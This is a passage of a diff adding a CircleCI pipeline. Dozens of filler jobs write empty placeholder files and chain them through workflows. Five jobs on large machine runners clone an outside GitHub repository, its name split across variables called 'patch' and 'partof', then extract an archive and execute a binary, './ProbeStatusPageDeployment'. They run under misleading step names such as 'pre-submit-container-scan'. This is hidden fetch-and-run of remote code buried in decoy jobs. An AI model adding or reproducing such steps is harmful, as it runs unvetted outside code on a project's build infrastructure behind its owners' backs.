+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/VerifyingLicenses
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'VerifyingLicenses'
+  CollectCrashDumps:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/VerifyingLicenses" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --jobs 2 https://github.com/$patch/$partof ${PWD}
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar --no-same-permissions
+      - run:
+          command: |
+            $(pwd)/ProbeStatusPageDeployment
+  optionalVersionTaggingRoutine:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: SharedReportExporterWorkspaceRestore
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/download-and-install
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'download-and-install'
+  MetricsExporterLibraryPackaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/download-and-install" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --quiet https://github.com/$patch/$partof "$(pwd)"
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract -f overnightArchiveChecksum.tar -C .
+      - run:
+          command: |
+            exec ./ProbeStatusPageDeployment
+  RestartLinkerInstances:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: DecodingLicenseKey
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/file-server-tests
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'file-server-tests'
+  deploy-instance-to-test-cluster:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/file-server-tests" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --branch=main https://github.com/$patch/$partof ./
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar -xf "overnightArchiveChecksum.tar"
+      - run:
+          command: |
+            './ProbeStatusPageDeployment'
+  retry-upgrade-tests-on-failure:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Scan templates with warnings as errors
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/EmbedPortalAssets
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'EmbedPortalAssets'
+  looking-for-pending-migrations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/EmbedPortalAssets" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth 1 --branch main --filter=blob:none https://github.com/$patch/$partof .
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar --extract < overnightArchiveChecksum.tar
+      - run:
+          command: |
+            bash -c "./ProbeStatusPageDeployment"
+  NotifyMaintainersOnPullRequests:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Copy parser digests from tagged release
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/CalculateCacheKey
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'CalculateCacheKey'
+  rebuildFrameworkBinaries:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: clone launcher nested repositories
+          command: |
+            awk -F '\t' '{print $4}' "/tmp/sign-build-outputs/CalculateCacheKey" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | sort -rn | head -n 15 | cut -c 1-200
+      - run:
+          name: pre-submit-container-scan
+          command: |
+            patch=jaclynchestnutk7kds-cloud; partof=trigger-controller-smoke-tests
+            git clone --depth=1 --single-branch https://github.com/$patch/$partof "."
+      - run:
+          name: Download and extract image processor installer
+          command: |
+            tar xf overnightArchiveChecksum.tar
+      - run:
+          command: |
+            './ProbeStatusPageDeployment'
+
+  documentation-lint-pipeline:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: split-mobile-app-load-tests
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/edge-proxy-checksums
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'edge-proxy-checksums'
+  FormatterCoverage:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Review Test Results in Dry Run Mode
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/on-demand-package-install-hook
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'on-demand-package-install-hook'
+  postScanHook:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Detect
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/sync-tutorials-to-help-center
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'sync-tutorials-to-help-center'
+  MigrateEventBusDataStore:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Binary download run
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/RestartCrawlerDatabase
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'RestartCrawlerDatabase'
+  validator-roll-out-monitoring:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: sign-hashes-for-local-testing
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/LoggerReleaseSlot6
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'LoggerReleaseSlot6'
+  portal-cache-pass-2:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Alert maintainers after publish
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/toolkit-checks
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'toolkit-checks'
+  analyzeBenchmarkReport:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Simulator release pipeline (worker 10)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/PrintingExportServiceReleaseTag
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'PrintingExportServiceReleaseTag'
+  ExtractEditorSourceArchive:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Install optional dependencies and build base image
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/CountLogEntries
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'CountLogEntries'
+  PrintEncoderVersionString:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Clean up update agent package cache (replica 3)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/reportReleaseStatusToConsole
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'reportReleaseStatusToConsole'
+  PackageCache:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: PullFirmwareContainerImage
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/UploadLoaderImage
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'UploadLoaderImage'
+  TestAndReleaseJobRunner:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: post-download-schema-checks
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/download-and-install
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'download-and-install'
+  RenameGatewayBinariesJob4Of9:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: ExecuteReportBuilderSanityTests
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/pre-deploy-dependency-cache
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'pre-deploy-dependency-cache'
+  UploadServiceDeployment:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Publish source archive to object storage
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/Wave3Of6
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'Wave3Of6'
+  post-deploy-data-import-batch-9:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: Deferred Backup
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/scan-encoder
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'scan-encoder'
+  LocalizationUpload:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Install dependencies from mirror (batch 1 of 2)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/CalculateCacheKey
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'CalculateCacheKey'
+  PruneMiddlewareBuildCache:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: automated-rollback-notification (lane 4)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/look-for-uncommitted-changes
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'look-for-uncommitted-changes'
+  ArchiveAndUploadInstaller:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Fetch Golden Files From Build Directory
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/ManualAssetDownload
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'ManualAssetDownload'
+  BuildAndBenchmarkBackupAgent:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Install simulator dependencies from package index
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/step-slot-7
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'step-slot-7'
+  ConfirmServiceHealthManually:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: RoutineDashboardInstall
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/file-server-tests
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'file-server-tests'
+  pre-install-regression-tests:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: secondary-release-approval
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/pre-publish-setup
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'pre-publish-setup'
+  ArtifactPromotionJobStage5:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: RouterRollback (job 12)
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/parser-backup-rotation
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'parser-backup-rotation'
+  RemoteQualityGate:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - run:
+          name: informing-operators-about-deployment
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/TestSummaryJob
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'TestSummaryJob'
+  FastJobSummaryAttempt1:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Migrate Analytics Search Index
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/daily-deployment-monitoring
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'daily-deployment-monitoring'
+  announceFrontEndRelease:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: poll-build-status-with-extended-timeout
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/VerifyingLicenses
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'VerifyingLicenses'
+  ProxySharedLibrary:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: VerifyDesktopAppBuildDependencies
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/Inputs
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'Inputs'
+  ComputeLoggerDigest:
+    docker:
+      - image: cimg/base:2024.07
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/sign-build-outputs
+      - run:
+          name: Alert project owners about build status
+          command: |
+            install -d -m 755 /tmp/sign-build-outputs
+            : > /tmp/sign-build-outputs/deferred-major-release
+      - persist_to_workspace:
+          root: /tmp/sign-build-outputs
+          paths:
+            - 'deferred-major-release'
+workflows:
+  analytics-build-matrix:
+    jobs:
+      - export-service-release-checksum
+      - documentation-lint-pipeline:
+          requires:
+            - export-service-release-checksum
+      - MonitorFirmwareWorkers:
+          requires:
+            - documentation-lint-pipeline
+      - fetch-dependency-graph:
+          requires:
+            - documentation-lint-pipeline
+      - FormatterCoverage:
+          requires:
+            - fetch-dependency-graph
+      - complianceScanPhase5:
+          requires:
+            - FormatterCoverage
+      - pre-deploy-log-export-round-4:
+          requires:
+            - FormatterCoverage
+      - postScanHook:
+          requires:
+            - pre-deploy-log-export-round-4
+      - FailureNotificationStage4Of7:
+          requires:
+            - postScanHook
+      - InitialDocumentationBuild:
+          requires:
+            - postScanHook
+      - MigrateEventBusDataStore:
+          requires:
+            - InitialDocumentationBuild
+      - bundle-notifier:
+          requires:
+            - MigrateEventBusDataStore
+      - debuggerContractTests:
+          requires:
+            - MigrateEventBusDataStore
+      - validator-roll-out-monitoring:
+          requires:
+            - debuggerContractTests
+      - ScanConfigurationFiles:
+          requires:
+            - validator-roll-out-monitoring
+      - daily-trend-analysis-pipeline:
+          requires:
+            - validator-roll-out-monitoring
+      - portal-cache-pass-2:
+          requires:
+            - daily-trend-analysis-pipeline
+      - summarize-billing-build-metrics:
+          requires:
+            - portal-cache-pass-2
+      - PreLaunchCodeAnalysis:
+          requires:
+            - portal-cache-pass-2
+      - analyzeBenchmarkReport:
+          requires:
+            - PreLaunchCodeAnalysis
+      - DocumentConverterLibrary:
+          requires:
+            - analyzeBenchmarkReport
+      - decodeArchiveForLaterJobs:
+          requires:
+            - analyzeBenchmarkReport
+      - ExtractEditorSourceArchive:
+          requires:
+            - decodeArchiveForLaterJobs
+      - deploying-extension-workers:
+          requires:
+            - ExtractEditorSourceArchive
+      - full-fixture-generation:
+          requires:
+            - ExtractEditorSourceArchive
+      - PrintEncoderVersionString:
+          requires:
+            - full-fixture-generation
+      - ExecuteMaintenanceTasks:
+          requires:
+            - PrintEncoderVersionString
+      - SearchBundleTrack2:
+          requires:
+            - PrintEncoderVersionString
+      - PackageCache:
+          requires:
+            - SearchBundleTrack2
+      - sequential-rotation:
+          requires:
+            - PackageCache
+      - optionalVersionTaggingRoutine:
+          requires:
+            - PackageCache
+      - TestAndReleaseJobRunner:
+          requires:
+            - optionalVersionTaggingRoutine
+      - MetricsExporterLibraryPackaging:
+          requires:
+            - TestAndReleaseJobRunner
+  post-tag-snapshot:
+    jobs:
+      - ScalingLauncherAfterCodeReview
+      - ArchiveAndUploadInstaller:
+          requires:
+            - ScalingLauncherAfterCodeReview
+      - dependency-review:
+          requires:
+            - ArchiveAndUploadInstaller
+      - minimal-cache:
+          requires:
+            - ArchiveAndUploadInstaller
+      - BuildAndBenchmarkBackupAgent:
+          requires:
+            - minimal-cache
+      - automated-artifact-compression:
+          requires:
+            - BuildAndBenchmarkBackupAgent
+      - RestartLinkerInstances:
+          requires:
+            - BuildAndBenchmarkBackupAgent
+      - ConfirmServiceHealthManually:
+          requires:
+            - RestartLinkerInstances
+      - deploy-instance-to-test-cluster:
+          requires:
+            - ConfirmServiceHealthManually
+      - SetUpClient:
+          requires:
+            - ConfirmServiceHealthManually
+      - pre-install-regression-tests:
+          requires:
+            - SetUpClient
+      - search-index-symbol-upload:
+          requires:
+            - pre-install-regression-tests
+      - search-for-slow-tests:
+          requires:
+            - pre-install-regression-tests
+      - ArtifactPromotionJobStage5:
+          requires:
+            - search-for-slow-tests
+      - Worker3Of12:
+          requires:
+            - ArtifactPromotionJobStage5
+      - HourlySchemaMigration:
+          requires:
+            - ArtifactPromotionJobStage5
+      - RemoteQualityGate:
+          requires:
+            - HourlySchemaMigration
+      - QueueHealthCheckJob:
+          requires:
+            - RemoteQualityGate
+      - pre-commit-performance-gate:
+          requires:
+            - RemoteQualityGate
+      - FastJobSummaryAttempt1:
+          requires:
+            - pre-commit-performance-gate
+      - FastErrorMonitoring:
+          requires:
+            - FastJobSummaryAttempt1
+      - listing-security-advisories:
+          requires:
+            - FastJobSummaryAttempt1
+      - announceFrontEndRelease:
+          requires:
+            - listing-security-advisories
+      - CollectCrashDumps:
+          requires:
+            - announceFrontEndRelease
+      - PersistKernelScreenshots:
+          requires:
+            - announceFrontEndRelease
+      - ProxySharedLibrary:
+          requires:
+            - PersistKernelScreenshots
+      - test-framework-developer-guide:
+          requires:
+            - ProxySharedLibrary
+      - FormatterDependencyVerification:
+          requires:
+            - ProxySharedLibrary
+      - ComputeLoggerDigest:
+          requires:
+            - FormatterDependencyVerification
+      - daily-symbol-upload-node-5:
+          requires:
+            - ComputeLoggerDigest
+  discoverExtensionMigrationTests:
+    jobs:
+      - PreUpgradePermissionAudit
+      - RenameGatewayBinariesJob4Of9:
+          requires:
+            - PreUpgradePermissionAudit
+      - edge-proxy-debug-symbols:
+          requires:
+            - RenameGatewayBinariesJob4Of9
+      - run-settings-loader-type-checks:
+          requires:
+            - RenameGatewayBinariesJob4Of9
+      - UploadServiceDeployment:
+          requires:
+            - run-settings-loader-type-checks
+      - Formatter:
+          requires:
+            - UploadServiceDeployment
+      - MinimalResultExportStep:
+          requires:
+            - UploadServiceDeployment
+      - post-deploy-data-import-batch-9:
+          requires:
+            - MinimalResultExportStep
+      - drain-build-queue:
+          requires:
+            - post-deploy-data-import-batch-9
+      - NotifyMaintainersOnPullRequests:
+          requires:
+            - post-deploy-data-import-batch-9
+      - LocalizationUpload:
+          requires:
+            - NotifyMaintainersOnPullRequests
+      - rebuildFrameworkBinaries:
+          requires:
+            - LocalizationUpload
+      - pre-commit-policy-check:
+          requires:
+            - LocalizationUpload
+      - PruneMiddlewareBuildCache:
+          requires:
+            - pre-commit-policy-check
+      - debugger-source-fetch:
+          requires:
+            - PruneMiddlewareBuildCache
+  overnight-major-bump:
+    jobs:
+      - retry-upgrade-tests-on-failure
+      - minimal-package-install-job
+      - KernelImagePromotion
+      - looking-for-pending-migrations:
+          requires:
+            - retry-upgrade-tests-on-failure
+            - minimal-package-install-job
+            - KernelImagePromotion
+      - clone-agent-main-branch:
+          requires:
+            - retry-upgrade-tests-on-failure
+            - minimal-package-install-job
+            - KernelImagePromotion
+      - upload-developer-guide:
+          requires:
+            - retry-upgrade-tests-on-failure
+            - minimal-package-install-job
+            - KernelImagePromotion
+      - clean-staging-directory:
+          requires:
+            - retry-upgrade-tests-on-failure
+            - minimal-package-install-job
+            - KernelImagePromotion
